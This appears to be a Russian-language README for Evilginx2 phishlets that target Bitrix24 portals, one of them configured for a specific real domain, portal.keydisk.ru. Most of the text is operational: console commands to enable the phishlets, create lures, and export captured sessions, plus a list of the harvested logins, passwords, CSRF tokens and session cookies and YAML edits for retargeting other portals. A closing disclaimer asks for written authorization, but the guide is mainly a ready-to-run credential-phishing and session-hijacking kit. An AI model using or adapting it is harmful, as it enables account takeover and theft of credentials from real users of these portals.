# 🏢 Bitrix24 Phishlets - Руководство по использованию

## 📋 Обзор

В составе AKUMA EvilGinx2 AutoInstaller включены специальные phishlets для работы с Bitrix24 - популярной российской CRM и корпоративной платформой.

## 🎯 Доступные Bitrix24 Phishlets

### 1. `bitrix24-keydisk.yaml` 
**Специально для portal.keydisk.ru**

- ✅ Настроен под конкретный домен `portal.keydisk.ru`
- ✅ Поддерживает стандартную авторизацию (логин/пароль)
- ✅ Обнаруживает социальную авторизацию (Google, LiveID)
- ✅ Извлекает специфичные для домена cookies
- ✅ Оптимизирован под Bitrix24 интерфейс

### 2. `bitrix24-universal.yaml`
**Универсальный для любого Bitrix24**

- ✅ Работает с любым доменом Bitrix24
- ✅ Поддерживает множественные формы авторизации
- ✅ Расширенная поддержка социальных сетей
- ✅ Fallback механизмы для нестандартных установок
- ✅ Гибкая настройка через переменные

## 🚀 Быстрый старт

### Для portal.keydisk.ru

```bash
# Запуск EvilGinx2 интерактивно
sudo ./evilginx2_manager.sh interactive

# В консоли EvilGinx2:
evilginx> phishlets hostname bitrix24-keydisk your-domain.com
evilginx> phishlets enable bitrix24-keydisk
evilginx> lures create bitrix24-keydisk
evilginx> lures get-url 0
```

### Для любого другого Bitrix24

```bash
# Запуск EvilGinx2 интерактивно
sudo ./evilginx2_manager.sh interactive

# В консоли EvilGinx2:
evilginx> phishlets hostname bitrix24-universal your-domain.com
evilginx> phishlets enable bitrix24-universal
evilginx> lures create bitrix24-universal
evilginx> lures get-url 0
```

## ⚙️ Детальная настройка

### 1. Настройка hostname

```bash
# Установить ваш поддомен для фишинга
evilginx> phishlets hostname bitrix24-keydisk example.com
```

### 2. Создание lure (приманки)

```bash
# Создать приманку с перенаправлением
evilginx> lures create bitrix24-keydisk
evilginx> lures edit 0 redirect_url https://portal.keydisk.ru
```

### 3. Настройка дополнительных параметров

```bash
# Просмотр всех сессий
evilginx> sessions

# Получение захваченных данных
evilginx> sessions 1

# Экспорт cookies
evilginx> sessions export 1 /tmp/cookies.json
```

## 🔍 Особенности Bitrix24

### Извлекаемые данные:

#### Учетные данные:
- **Логин** (`USER_LOGIN`)
- **Пароль** (`USER_PASSWORD`)
- **CSRF токен** (`bitrix_sessid`)
- **Форма авторизации** (`AUTH_FORM`)

#### Cookies:
- `KEYDISK_SM_UIDH` - ID пользователя
- `KEYDISK_SM_LOGIN` - Логин пользователя  
- `KEYDISK_SM_CC` - Контрольная сумма
- `BITRIX_SM_SALE_UID` - ID продаж

#### Социальная авторизация:
- **Google OAuth**
- **Microsoft LiveID**
- **Facebook** (если настроено)

### URL-паттерны:
- `/index.php?login=yes` - Основная страница входа
- `/auth/` - Альтернативная авторизация
- `/bitrix/tools/oauth/` - OAuth авторизация

## 🛠️ Расширенная настройка

### Редактирование phishlet

```bash
# Открыть phishlet для редактирования
sudo nano /root/evilginx2-data/phishlets/bitrix24-keydisk.yaml
```

### Основные параметры для изменения:

```yaml
# Изменить домен цели
proxy_hosts:
  - {domain: 'your-target.bitrix24.ru', session: true, is_landing: true}

# Добавить дополнительные cookies
auth_tokens:
  - domain: '.your-target.ru'
    keys: ['CUSTOM_SESSION', 'USER_TOKEN']

# Дополнительные URL авторизации
auth_urls:
  - '/custom-login/'
  - '/sso/'
```

## 🎯 Примеры использования

### 1. Тестирование корпоративного Bitrix24

```bash
evilginx> phishlets hostname bitrix24-universal company.bitrix24.ru
evilginx> phishlets enable bitrix24-universal
evilginx> lures create bitrix24-universal
evilginx> lures edit 0 redirect_url https://company.bitrix24.ru/crm/
```

### 2. Тестирование с поддоменом

```bash
evilginx> phishlets hostname bitrix24-keydisk phishing-test.com
evilginx> lures create bitrix24-keydisk  
evilginx> lures edit 0 path /login
```

### 3. Использование с SSL

```bash
# EvilGinx2 автоматически получит Let's Encrypt сертификат
evilginx> config domain phishing-test.com
evilginx> config ip 1.2.3.4
```

## 📊 Мониторинг и логи

### Просмотр активности в реальном времени:

```bash
# В отдельном терминале
sudo ./evilginx2_manager.sh follow

# Или просмотр логов
sudo ./evilginx2_manager.sh logs
```

### Структура логов:

- **Захваченные данные**: `/root/evilginx2-data/database/`
- **Системные логи**: `journalctl -u evilginx2`
- **Debug информация**: запуск с `-debug`

## ⚠️ Troubleshooting

### Частые проблемы:

#### 1. Phishlet не загружается
```bash
# Проверить синтаксис
evilginx> phishlets
evilginx> phishlets get bitrix24-keydisk
```

#### 2. Не работают фильтры
```bash
# Проверить настройки domain replacement
evilginx> config debug true
```

#### 3. Не извлекаются cookies
```bash
# Проверить auth_tokens настройки
evilginx> sessions 
```

### Логи отладки:

```bash
# Запуск с отладкой
sudo evilginx -debug -p /root/evilginx2-data/phishlets -c /root/evilginx2-data
```

## 🔒 Безопасность и легальность

### ⚠️ КРИТИЧЕСКИЕ ЗАМЕЧАНИЯ:

> **Используйте ТОЛЬКО для авторизованного тестирования!**

- ✅ Получите **письменное разрешение** от владельца системы
- ✅ Используйте только в **тестовой среде**
- ✅ **Уничтожайте данные** после завершения тестирования
- ❌ **НЕ используйте** для незаконного доступа
- ❌ **НЕ сохраняйте** реальные учетные данные

### Рекомендуемые практики:

1. **Изолированная среда** - используйте отдельные VPS
2. **Короткие сессии** - минимизируйте время работы phishlet
3. **Немедленное уведомление** - сообщайте о найденных уязвимостях
4. **Документирование** - ведите подробные отчеты о тестировании

## 📚 Дополнительные ресурсы

- 📖 [Официальная документация EvilGinx2](https://help.evilginx.com)
- 🔧 [GitHub репозиторий](https://github.com/kgretzky/evilginx2)
- 🎓 [Курс Evilginx Mastery](https://academy.breakdev.org/evilginx-mastery)
- 🏢 [Официальный сайт Bitrix24](https://www.bitrix24.ru)

---

**⚖️ Помните: Используйте свои навыки для защиты, а не для вреда!**
